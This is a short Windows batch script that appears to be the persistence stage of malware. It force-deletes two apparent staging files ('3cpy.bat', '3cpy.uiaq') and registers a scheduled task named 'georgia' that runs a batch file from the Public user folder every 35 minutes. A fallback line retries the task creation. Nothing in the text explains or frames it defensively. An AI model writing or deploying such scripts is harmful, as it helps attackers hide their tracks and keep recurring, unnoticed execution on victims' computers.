

echo 4sch

del /F /Q 3cpy.bat
del /F /Q 3cpy.uiaq

SCHTASKS    /Create /SC MINUTE /MO 35 /TN georgia /TR "C:\Users\Public\MiCert.bat" /f || SCHTASKS    /Create /SC MINUTE /MO 35 /TN georgia /TR C:\Users\Public\MiCert.bat /f
